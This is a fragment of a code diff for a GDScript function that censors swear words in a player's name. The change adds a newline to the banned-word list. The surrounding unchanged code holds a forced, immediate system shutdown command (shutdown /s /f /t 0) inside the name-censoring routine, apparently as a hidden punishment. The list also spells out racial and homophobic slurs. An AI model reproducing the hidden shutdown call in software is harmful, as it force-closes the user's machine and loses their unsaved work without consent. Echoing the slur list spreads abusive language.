@@ -57,7 +57,7 @@ func censorSwears(realName: String) -> String:
 		OS.execute("shutdown", ["/s", "/f", "/t", "0"])
 		
 	
-	var swears = ["fag","faggot","bitch","slut","whore","fuck","bastard","nigger","chink","nigga","shit","toucher","penis","vagina","pussy","ass","cum","jizz","tit"]  # Replace with actual swears
+	var swears = ["\n","fag","faggot","bitch","slut","whore","fuck","bastard","nigger","chink","nigga","shit","toucher","penis","vagina","pussy","ass","cum","jizz","tit"]  # Replace with actual swears
 	var censoredName = realName
 	for swear in swears:
 		var temp = ""
